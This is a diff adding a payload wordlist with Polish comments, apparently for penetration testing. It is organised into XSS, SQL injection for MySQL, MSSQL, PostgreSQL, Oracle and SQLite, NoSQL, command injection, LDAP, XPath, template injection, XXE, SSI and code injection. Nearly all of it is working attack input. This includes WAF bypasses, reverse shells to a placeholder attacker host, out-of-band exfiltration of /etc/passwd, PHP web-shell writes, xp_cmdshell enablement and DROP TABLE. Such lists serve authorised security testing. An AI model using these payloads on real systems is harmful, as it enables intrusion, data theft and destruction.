@@ -1,0 +1,1388 @@
+
+# ============ XSS/XSS-REFLECTED ============
+# === Detection canaries ===
+# Minimal probe — wykrywa reflected input bez wykonania
+'"<>
+# Quote/bracket fingerprint — sprawdza, które znaki są filtrowane
+"><svg/onload=confirm(1)>
+# Unique marker do grep w response
+xssTEST123
+
+# === Standard <script> ===
+# Klasyczny — działa poza kontekstami sanitizowanymi
+<script>alert(1)</script>
+# Bez znaczników kończących — często wystarczy
+<script>alert(1)//
+# Self-closing wariant
+<script/src=data:,alert(1)>
+
+# === Image vectors ===
+# Najpopularniejszy bypass <script> blacklisty
+<img src=x onerror=alert(1)>
+# Bez cudzysłowów (bypass quote-stripping)
+<img src=x onerror=alert(1)//
+# Z onload zamiast onerror
+<img src=1 onload=alert(1)>
+
+# === SVG vectors ===
+# Bypass filtrów blokujących <script> i <img>
+<svg onload=alert(1)>
+# SVG z animacją (omija część WAF)
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+# SVG + script element wewnątrz
+<svg><script>alert(1)</script></svg>
+
+# === Body/iframe/details ===
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<iframe srcdoc="<script>alert(1)</script>">
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+
+# === Input/form vectors ===
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+
+# === Anchor / javascript: URI ===
+<a href="javascript:alert(1)">click</a>
+# Tab/newline w schemacie — bypass naive blacklist
+<a href="java&#9;script:alert(1)">x</a>
+
+# === Event handler bez tagu ===
+# Dla kontekstu gdzie HTML już jest, doklejamy event
+" onmouseover=alert(1) x="
+" autofocus onfocus=alert(1) x="
+
+# === Mutation XSS ===
+# DOMPurify bypass via mXSS (historyczny, zostawiamy do testów regresji)
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+
+# === Base tag hijack ===
+# Przekierowuje względne <script src=...> na atakującego
+<base href="//{{ATTACKER}}/">
+
+# ============ XSS/XSS-ATTRIBUTE-CONTEXT ============
+# === Wewnątrz wartości atrybutu z " ===
+# Domyka cudzysłów + nowy event handler + komentarz
+" autofocus onfocus=alert(1) x="
+" onmouseover=alert(1) "
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+
+# === Wewnątrz wartości atrybutu z ' ===
+' autofocus onfocus=alert(1) x='
+' onmouseover=alert(1) '
+'><script>alert(1)</script>
+
+# === Bez cudzysłowów (atrybut nieotoczony) ===
+# value=USER_INPUT bez quotes
+x onmouseover=alert(1)
+/onmouseover=alert(1)//
+
+# === Atrybut href / src — javascript: ===
+javascript:alert(1)
+javascript:alert(1)//
+JaVaScRiPt:alert(1)
+# Z whitespace na początku (bypass startsWith check)
+ javascript:alert(1)
+%09javascript:alert(1)
+&#x6a;avascript:alert(1)
+
+# === srcdoc / data: ===
+"><iframe srcdoc="<script>alert(1)</script>">
+
+# === Bez breakout — pure event ===
+# Jeśli wstrzykujesz w atrybut typu onclick="USER"
+alert(1)
+alert(1);//
+'-alert(1)-'
+"-alert(1)-"
+
+# === Style attribute ===
+# Wewnątrz style="..." — expression() w starym IE / behavior:url()
+"><svg style="background:url(javascript:alert(1))"
+
+# === Wewnątrz <textarea> / <title> / <noscript> ===
+# Te kontenery wymagają zamknięcia tagu
+</textarea><script>alert(1)</script>
+</title><script>alert(1)</script>
+</noscript><script>alert(1)</script>
+
+# ============ XSS/XSS-JS-CONTEXT ============
+# === Wewnątrz JS string z ' ===
+# Klasyczne wyjście z apostrofa
+';alert(1)//
+';alert(1);//
+\\';alert(1)//
+
+# === Wewnątrz JS string z " ===
+";alert(1)//
+";alert(1);//
+\\";alert(1)//
+
+# === Wewnątrz template literal `${...}` ===
+${alert(1)}
+`+alert(1)+`
+${alert`1`}
+
+# === Wewnątrz JS bez stringu (numeric/raw) ===
+# Jeśli var x = USER (bez quote)
+1;alert(1)
+0||alert(1)
+1+alert(1)+1
+
+# === Inline JSON, parseowane przez JSON.parse ===
+# Domyka string + nowa właściwość — wymaga eval
+\"});alert(1);//
+
+# === JS context wewnątrz <script> z </script> blokowane ===
+# Bypass via <\/script> w stringu, tu domykamy całość
+</script><script>alert(1)</script>
+
+# === Function-level breakout ===
+);alert(1);(
+});alert(1);//
+});alert(1);({
+
+# === Backslash escape neutralization ===
+# Jeśli aplikacja escapuje \ i ' — \\ przechodzi a potem ' łamie
+\\';alert(1);//
+
+# === Comment line break ===
+# JS line break comment — gdy tylko // jest dozwolone
+\n;alert(1)//
+ alert(1)
+ alert(1)
+
+# ============ XSS/XSS-DOM ============
+# === innerHTML / document.write sinks ===
+# Dla URL-a wstrzykiwanego do innerHTML/document.write
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+
+# === location / href sinks ===
+# Gdy parametr trafia do location, href, src
+javascript:alert(1)
+# Z encodingiem (omija proste 'javascript:' filtry)
+java%0ascript:alert(1)
+javascript&colon;alert(1)
+# Data URI — czasem akceptowane przez href
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# === eval / setTimeout / Function sinks ===
+# String trafia do eval() — domykamy i wstrzykujemy
+');alert(1)//
+");alert(1)//
+\';alert(1)//
+
+# === document.location.hash / search ===
+# Hash payload (nie idzie do serwera, tylko DOM)
+#<img src=x onerror=alert(1)>
+#"><svg onload=alert(1)>
+#javascript:alert(1)
+
+# === jQuery $() sink (CVE-2020-11022 i podobne) ===
+# Jeśli $(userInput) — selector treated as HTML
+<img src=x onerror=alert(1)>
+
+# === postMessage origin = * ===
+# Patrz client-side/postmessage.txt
+
+# === AngularJS sandbox bypass (1.x) ===
+# Dla aplikacji z legacy AngularJS w {{ }}
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+
+# === DOM clobbering markers ===
+<form id=x><input id=attributes>
+<a id=x name=y href=//evil>
+
+# === Script gadget triggers ===
+# Dla aplikacji używających analytics/jQuery z gadgetami
+<form><button formaction=javascript:alert(1)>x
+<a href=javascript:alert(1)>x</a>
+
+# === setTimeout('string') sink ===
+\";alert(1);//
+';alert(1);//
+
+# === Template literal context (ES6) ===
+${alert(1)}
+`}+alert(1)+`
+
+# ============ XSS/XSS-FILTER-BYPASS ============
+# === Case variation ===
+# Bypass case-sensitive blacklist
+<ScRiPt>alert(1)</ScRiPt>
+<IMG SRC=x ONERROR=alert(1)>
+
+# === Bez spacji (slash zamiast space) ===
+<svg/onload=alert(1)>
+<img/src=x/onerror=alert(1)>
+<svg\x09onload=alert(1)>
+<svg\x0Conload=alert(1)>
+
+# === HTML entity encoding ===
+# &#x3C; / &#60; — bypass naive < block
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+&lt;script&gt;alert(1)&lt;/script&gt;
+# Bez średnika (akceptowane przez wiele parserów)
+&#x3Cscript&#x3Ealert(1)&#x3C/script&#x3E
+
+# === URL encoding (single + double) ===
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+
+# === Unicode escapes (in JS context) ===
+<script>alert(1)</script>
+alert(1)
+
+# === String split/concat (bypass keyword block) ===
+<svg onload=window['ale'+'rt'](1)>
+<svg onload=window['\x61lert'](1)>
+<img src=x onerror=top["al"+"ert"](1)>
+
+# === Backtick / template literal call ===
+# Bypass filtrów wymagających ( po alert
+<svg onload=alert`1`>
+<img src=x onerror=alert`1`>
+
+# === Throw / location bypass ===
+<svg onload=throw onerror=alert,1>
+<svg onload=location='javascript:alert(1)'>
+
+# === SVG with namespace tricks ===
+<svg><script xlink:href=data:,alert(1) />
+<svg><use href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIGlkPSd4Jz48aW1hZ2UgaHJlZj0nMScgb25lcnJvcj0nYWxlcnQoMSknIC8+PC9zdmc+#x"/>
+
+# === Null byte / control char (legacy stacks) ===
+<scri%00pt>alert(1)</scri%00pt>
+<img src=x onerror=\x00alert(1)>
+
+# === Cloudflare WAF bypass (historical) ===
+<svg/onload=&#97&#108&#101&#114&#116(1)>
+<a href="javascript:%0aalert(1)">x</a>
+
+# === ModSecurity CRS bypass ===
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror=eval(/aler/.source+/t(1)/.source)>
+
+# === AWS WAF bypass (historical) ===
+<svg/onload=alert?.(1)>
+<svg onload="(()=>alert(1))()">
+
+# === Encoded event handler ===
+<a onmouseover&#x3D;alert(1)>x
+<svg onload&#x3D;alert(1)>
+
+# === Comment injection (HTML) ===
+<!--><svg onload=alert(1)>
+<! --><svg onload=alert(1)>
+
+# === Polyglot tag confusion (parser desync) ===
+<a"<b><script>alert(1)</script>
+
+# ============ XSS/XSS-POLYGLOT ============
+# === Gareth Heyes / OWASP XSS Polyglot ===
+# Klasyczny multi-context polyglot — działa w 26+ kontekstach
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+# === Brutelogic short polyglot ===
+# Krótszy, działa w HTML body + atrybut + JS string
+"><svg onload=alert(1)>"-alert(1)-"
+
+# === Comment-breaker polyglot ===
+# Wybija się z HTML comment + JS comment + atrybutu
+--><svg onload=alert(1)>
+*/alert(1)/*
+*/</script><svg onload=alert(1)>
+
+# === RPo / relative path overwrite friendly ===
+'"--></style></script><script>alert(1)</script>
+
+# === JS string + HTML breakout ===
+\';alert(1);//<svg onload=alert(1)>
+
+# === Markdown context (gdy aplikacja renderuje MD) ===
+[xss](javascript:alert(1))
+![xss](javascript:alert(1))
+
+# === CSV injection (Excel formulas) — XSS-pokrewne ===
+=HYPERLINK("javascript:alert(1)","click")
+
+# === SVG file-upload polyglot ===
+# Wgrany jako .svg, renderowany w <img src> nie odpala — w <object> tak
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+
+# ============ INJECTION/SQLI-GENERIC ============
+# === Detection — error-based ===
+# Pojedynczy apostrof — najszybszy probe
+'
+"
+\
+;
+# Domknięcie nawiasu / komentarza
+')
+")
+'))
+';--
+'-- -
+
+# === Boolean-based truthy/falsy ===
+' OR '1'='1
+' OR '1'='1'-- -
+' OR 1=1-- -
+' AND '1'='2
+" OR "1"="1
+1 OR 1=1
+1) OR (1=1
+admin'-- -
+admin'#
+
+# === Authentication bypass ===
+' OR ''='
+' OR 1=1 LIMIT 1-- -
+admin' OR '1'='1'#
+' UNION SELECT 'admin','admin'-- -
+" OR ""="
+
+# === UNION SELECT detection ===
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL-- -
+' ORDER BY 1-- -
+' ORDER BY 100-- -
+' GROUP BY 1-- -
+
+# === Stacked queries ===
+'; DROP TABLE users-- -
+'; SELECT pg_sleep(5)-- -
+
+# === Generic error triggers ===
+'+convert(int,@@version)+'
+' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
+
+# === SQLi polyglots ===
+# Działa w wielu dialektach + WAF bypass
+SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
+# Klasyczny — wstrzyknięty w WHERE x = '$IN'
+') OR ('1'=('1
+# Multi-context (numeric + string + parenthesized)
+1' AND 1=1 UNION SELECT 1,2,3--+
+
+# === Whitespace bypass ===
+'/**/OR/**/'1'='1
+'%09OR%091=1-- -
+'%0AOR%0A1=1-- -
+
+# === Keyword bypass (UNION blocked) ===
+'+UnIoN+SeLeCt+1,2,3-- -
+'/*!UNION*/+/*!SELECT*/+1,2,3-- -
+
+# === Out-of-band trigger (DNS) ===
+# Wymagana podmiana {{OOB}}
+'; SELECT load_file(CONCAT('\\\\', (SELECT version()), '.{{OOB}}\\test'))-- -
+
+# ============ INJECTION/SQLI-MYSQL ============
+# === Time-based blind ===
+' AND SLEEP(5)-- -
+' AND IF(1=1,SLEEP(5),0)-- -
+' OR SLEEP(5)-- -
+' AND BENCHMARK(5000000,MD5('a'))-- -
+
+# === Error-based extraction ===
+' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
+' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -
+' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT version()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+
+# === UNION — info_schema enum ===
+' UNION SELECT @@version,user(),database()-- -
+' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ','),2,3 FROM information_schema.tables WHERE table_schema=database()-- -
+' UNION SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_name='users'-- -
+
+# === File read (LOAD_FILE — wymaga FILE priv) ===
+' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -
+' UNION SELECT 1,LOAD_FILE(0x2f6574632f706173737764),3-- -
+
+# === File write (INTO OUTFILE) ===
+' UNION SELECT '<?php system($_GET[0]);?>',2,3 INTO OUTFILE '/var/www/html/x.php'-- -
+
+# === Comment variants ===
+'#
+'-- -
+'/*
+'%23
+
+# === MySQL-specific WAF bypass ===
+# Inline comment wewnątrz keywordów
+'/*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -
+# Backtick zamiast spacji
+'UNION(SELECT(1),(2),(3))-- -
+
+# === Login bypass — MySQL ===
+' OR 1=1 LIMIT 1-- -
+admin' AND 1=0 UNION SELECT 1,'admin',MD5('password')-- -
+
+# ============ INJECTION/SQLI-MSSQL ============
+# === Time-based blind ===
+'; WAITFOR DELAY '0:0:5'-- -
+'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
+'; IF (LEN(DB_NAME())>0) WAITFOR DELAY '0:0:5'-- -
+
+# === Error-based ===
+' AND 1=CONVERT(int,@@version)-- -
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))-- -
+'; SELECT 1/0-- -
+
+# === UNION enumeration ===
+' UNION SELECT @@version,user_name(),db_name()-- -
+' UNION SELECT name,2,3 FROM sysobjects WHERE xtype='U'-- -
+' UNION SELECT name,2,3 FROM syscolumns WHERE id=OBJECT_ID('users')-- -
+
+# === Stacked / RCE via xp_cmdshell ===
+'; EXEC xp_cmdshell 'whoami'-- -
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -
+
+# === Out-of-band — DNS ===
+# Wymagana podmiana {{OOB}}
+'; EXEC master..xp_dirtree '\\{{OOB}}\share'-- -
+'; DECLARE @x varchar(1024); SET @x=(SELECT TOP 1 name FROM sysobjects); EXEC('master..xp_dirtree "\\'+@x+'.{{OOB}}\\x"')-- -
+
+# === Comment variants ===
+'-- -
+'/*
+
+# === Login bypass ===
+' OR 1=1-- -
+admin'-- -
+
+# ============ INJECTION/SQLI-POSTGRESQL ============
+# === Time-based blind ===
+'; SELECT pg_sleep(5)-- -
+' OR (SELECT pg_sleep(5)) IS NOT NULL-- -
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
+
+# === Error-based ===
+' AND 1=CAST(version() AS int)-- -
+' AND 1=CAST((SELECT current_user) AS int)-- -
+
+# === UNION enumeration ===
+' UNION SELECT version(),current_user,current_database()-- -
+' UNION SELECT table_name,2,3 FROM information_schema.tables-- -
+' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -
+
+# === RCE via COPY (PostgreSQL >= 9.3, superuser) ===
+'; COPY (SELECT '') TO PROGRAM 'id > /tmp/x'-- -
+'; DROP TABLE IF EXISTS x; CREATE TABLE x(c text); COPY x FROM PROGRAM 'id'-- -
+
+# === File read ===
+' UNION SELECT pg_read_file('/etc/passwd'),2,3-- -
+'; CREATE TABLE x(c text); COPY x FROM '/etc/passwd'-- -
+
+# === DBLINK exfiltration (OOB) ===
+# Wymagana podmiana {{ATTACKER}}
+'; SELECT * FROM dblink('host={{ATTACKER}} user=postgres password=x dbname=postgres','SELECT 1') AS t(c text)-- -
+
+# ============ INJECTION/SQLI-ORACLE ============
+# === Time-based blind ===
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
+' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
+
+# === Error-based extraction ===
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -
+' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -
+
+# === UNION (FROM dual is mandatory) ===
+' UNION SELECT banner,NULL,NULL FROM v$version-- -
+' UNION SELECT table_name,NULL,NULL FROM all_tables-- -
+' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='USERS'-- -
+
+# === Out-of-band (UTL_HTTP / UTL_INADDR) ===
+# Wymagana podmiana {{OOB}}
+' AND UTL_HTTP.REQUEST('http://{{OOB}}/'||(SELECT user FROM dual)) IS NOT NULL-- -
+' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.{{OOB}}') IS NOT NULL-- -
+
+# === Login bypass ===
+' OR 1=1-- -
+admin'-- -
+
+# ============ INJECTION/SQLI-SQLITE ============
+# === Detection ===
+'
+' AND 1=1-- -
+' AND 1=2-- -
+
+# === Time-based (SQLite ma slabe time funcs — heavy CPU) ===
+' AND randomblob(100000000)-- -
+' AND (SELECT count(*) FROM sqlite_master,sqlite_master,sqlite_master)-- -
+
+# === Enumeration ===
+' UNION SELECT sqlite_version(),2,3-- -
+' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table'-- -
+' UNION SELECT sql,2,3 FROM sqlite_master WHERE type='table'-- -
+
+# === RCE via load_extension (rzadko enabled) ===
+'; SELECT load_extension('/tmp/lib.so','entry')-- -
+
+# === ATTACH database (write to arbitrary path) ===
+'; ATTACH DATABASE '/var/www/x.php' AS x; CREATE TABLE x.y(c text); INSERT INTO x.y VALUES('<?php system($_GET[0]);?>')-- -
+
+# ============ INJECTION/NOSQL ============
+# === MongoDB — operator injection (JSON body) ===
+# Auth bypass — $ne (not equal)
+{"username":{"$ne":null},"password":{"$ne":null}}
+{"username":"admin","password":{"$ne":""}}
+# $gt (greater than)
+{"username":{"$gt":""},"password":{"$gt":""}}
+# $regex
+{"username":"admin","password":{"$regex":".*"}}
+# $exists
+{"username":"admin","password":{"$exists":true}}
+
+# === MongoDB — query string operator injection ===
+# Aplikacja parsuje ?username[$ne]=...
+username[$ne]=foo&password[$ne]=foo
+username[$regex]=^adm&password[$ne]=foo
+username=admin&password[$gt]=
+
+# === MongoDB — JS injection ($where) ===
+{"$where":"this.password=='a'||'1'=='1'"}
+{"username":"admin","$where":"sleep(5000)"}
+';return(true);var x='
+';sleep(5000);var x='
+0;return true
+1;return true
+
+# === Boolean blind extraction ===
+{"username":{"$regex":"^a"},"password":{"$ne":""}}
+{"username":"admin","password":{"$regex":"^a.*"}}
+
+# === CouchDB ===
+# _all_docs disclosure (out of payload scope; konfiguracja)
+# Lucene query injection
+*:*
+
+# === Redis (gdy parametr trafia do CONFIG/EVAL) ===
+# CRLF do Redis (RESP injection)
+%0d%0aCONFIG%20SET%20dir%20/tmp%0d%0a
+
+# ============ INJECTION/COMMAND-INJECTION ============
+# === Detection canaries (Unix) ===
+;id
+|id
+&&id
+||id
+`id`
+$(id)
+;`id`
+
+# === Detection canaries (Windows) ===
+&whoami
+|whoami
+&&whoami
+||whoami
+
+# === Newline injection (gdy spacje filtrowane) ===
+%0aid
+%0a/bin/id
+%0d%0aid
+
+# === Time-based blind (Unix) ===
+;sleep 5
+|sleep 5
+`sleep 5`
+$(sleep 5)
+;ping -c 5 127.0.0.1
+%0asleep%205
+
+# === Time-based blind (Windows) ===
+&ping -n 5 127.0.0.1
+&timeout /t 5
+
+# === Bypass — bez spacji ===
+{cat,/etc/passwd}
+cat${IFS}/etc/passwd
+cat$IFS$9/etc/passwd
+cat</etc/passwd
+
+# === Bypass — keyword filter (cat, id, sh) ===
+c''at /etc/passwd
+c"a"t /etc/passwd
+c\at /etc/passwd
+/bin/c?t /etc/passwd
+/???/??t /etc/passwd
+/bin/[c]at /etc/passwd
+
+# === Bypass — slash filter ===
+cat${IFS}\$(echo${IFS}-e${IFS}'\x2fetc\x2fpasswd')
+
+# === Out-of-band detection (DNS) ===
+# Wymagana podmiana {{OOB}}
+;curl http://{{OOB}}/`whoami`
+;nslookup `whoami`.{{OOB}}
+;ping -c 1 `whoami`.{{OOB}}
+$(curl http://{{OOB}}/$(id|base64))
+
+# === Reverse shell (Unix) — wymaga {{ATTACKER}} ===
+;bash -c 'bash -i >& /dev/tcp/{{ATTACKER}}/4444 0>&1'
+;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{ATTACKER}} 4444 >/tmp/f
+;python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{{ATTACKER}}",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'
+
+# === Wildcards / globbing ===
+/???/??t /???/p??s??
+
+# === Polyglot (działa w wielu kontekstach) ===
+;id|`id`&id&&id||id
+
+# ============ INJECTION/LDAP ============
+# === Detection ===
+*
+(
+)
+\
+*)(
+*))%00
+
+# === Auth bypass — basic ===
+*)(uid=*))(|(uid=*
+*)(|(password=*))
+admin)(&(password=*))
+admin)(!(&(1=0)))
+*)(|(objectclass=*))
+
+# === Boolean truthy ===
+*)(|(cn=*))
+*)(|(uid=*))
+*))(|(cn=*
+
+# === Blind — character extraction ===
+*)(uid=a*))(|(uid=*
+*)(uid=ab*))(|(uid=*
+admin*
+
+# === RFC special chars (escape testing) ===
+\28
+\29
+\5c
+\2a
+
+# === SQL-style fallback (gdy backend miesza) ===
+admin')-- -
+
+# === Filter break ===
+)(cn=))\x00
+)(|(password=*))
+*)(uid=*
+
+# ============ INJECTION/XPATH ============
+# === Detection ===
+'
+"
+'"
+]
+)
+'](
+
+# === Auth bypass ===
+' or '1'='1
+' or 1=1 or ''='
+'] | //user[username/text()='admin' and ''='
+' or name(.)='username
+admin' or '1'='1
+admin'/*
+
+# === Boolean blind ===
+' and '1'='1
+' and '1'='2
+' and string-length(name(/*[1]))=4 and ''='
+' and substring(name(/*[1]),1,1)='r' and ''='
+
+# === Node enumeration ===
+' or count(/*)=1 or ''='
+' or count(//user)>0 or ''='
+
+# === XPath 2.0 specific ===
+' or doc-available('http://{{OOB}}/') or '
+
+# ============ INJECTION/SSTI ============
+# === Detection — multi-engine probe ===
+${{<%[%'"}}%\
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+@(7*7)
+[[${7*7}]]
+
+# === Jinja2 (Python) ===
+{{7*'7'}}
+{{config}}
+{{config.items()}}
+{{ self.__init__.__globals__.__builtins__ }}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}
+
+# === Twig (PHP) ===
+{{7*'7'}}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+{{['id']|filter('system')}}
+{{['cat /etc/passwd']|map('system')|join}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+# === Smarty (PHP) ===
+{$smarty.version}
+{php}echo `id`;{/php}
+{system('id')}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}
+
+# === Freemarker (Java) ===
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${"freemarker.template.utility.Execute"?new()("id")}
+[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}
+
+# === Velocity (Java) ===
+#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($p=$rt.getRuntime().exec("id"))$p.waitFor()
+$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
+
+# === ERB (Ruby) ===
+<%= 7*7 %>
+<%= system('id') %>
+<%= `id` %>
+<%= File.open('/etc/passwd').read %>
+<%= IO.popen('id').read() %>
+
+# === Mako (Python) ===
+${7*7}
+<%import os; x=os.popen('id').read()%>${x}
+${self.module.cache.util.os.system("id")}
+
+# === Spring SpEL (Java) ===
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+
+# === Handlebars / Pug / EJS (Node) ===
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+#{process.mainModule.require('child_process').execSync('id')}
+<%= global.process.mainModule.require('child_process').execSync('id') %>
+
+# === Thymeleaf (Java) ===
+[[${7*7}]]
+[[${T(java.lang.Runtime).getRuntime().exec("id")}]]
+
+# === Razor (.NET) ===
+@(1+2)
+@{// C# code }
+
+# === Slim / Liquid ===
+{{7 | times: 7}}
+
+# ============ INJECTION/XXE ============
+# === Classic — file read (Linux) ===
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
+
+# === Classic — file read (Windows) ===
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>
+
+# === Wewnątrz parametru (gdy <r> jest immutable) ===
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM "file:///etc/passwd"><!ENTITY % e "<!ENTITY x '%d;'>">%e;]><r>&x;</r>
+
+# === PHP wrapper (base64) — bypass binary content errors ===
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><r>&x;</r>
+
+# === SSRF via XXE ===
+# Wymagana podmiana {{TARGET}}
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://{{TARGET}}/internal/admin">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>
+
+# === Out-of-band exfil (OOB) ===
+# Wymagana podmiana {{OOB}} — DTD na atakującym
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % ext SYSTEM "http://{{OOB}}/x.dtd">%ext;]>
+# x.dtd content (host na atakującym):
+# <!ENTITY % p SYSTEM "file:///etc/passwd"><!ENTITY % w "<!ENTITY &#x25; o SYSTEM 'http://{{OOB}}/?d=%p;'>">%w;%o;
+
+# === Billion laughs (DoS) — używaj świadomie ===
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>
+
+# === XInclude (gdy XML processor wspiera) ===
+<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>
+
+# === SVG XXE (file upload) ===
+<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>
+
+# === Office Open XML / SOAP triggers ===
+<?xml version="1.0"?><!DOCTYPE soap:Envelope [<!ENTITY x SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body>&x;</soap:Body></soap:Envelope>
+
+# === Parameter entity blind detection ===
+<!DOCTYPE r [<!ENTITY % p SYSTEM "http://{{OOB}}/">%p;]>
+
+# ============ INJECTION/SSI ============
+# === Detection / printenv ===
+<!--#printenv -->
+<!--#echo var="DATE_LOCAL" -->
+<!--#echo var="DOCUMENT_NAME" -->
+
+# === File include ===
+<!--#include virtual="/etc/passwd" -->
+<!--#include file="../../etc/passwd" -->
+
+# === Command exec ===
+<!--#exec cmd="id" -->
+<!--#exec cmd="ls /" -->
+<!--#exec cmd="whoami" -->
+
+# === Reverse shell trigger ===
+# Wymagana podmiana {{ATTACKER}}
+<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/{{ATTACKER}}/4444 0>&1'" -->
+
+# ============ INJECTION/CODE-INJECTION ============
+# === PHP eval/preg_replace /e ===
+;system('id');//
+;phpinfo();//
+'.system('id').'
+${@phpinfo()}
+${system('id')}
+
+# === Python eval/exec ===
+__import__('os').system('id')
+__import__('os').popen('id').read()
+().__class__.__bases__[0].__subclasses__()
+exec("import os; os.system('id')")
+
+# === Python pickle (insecure deserialization marker) ===
+cos\nsystem\n(S'id'\ntR.
+
+# === Ruby eval ===
+`id`
+system('id')
+%x(id)
+eval('`id`')
+
+# === Node.js eval / new Function ===
+require('child_process').execSync('id').toString()
+process.mainModule.require('child_process').execSync('id')
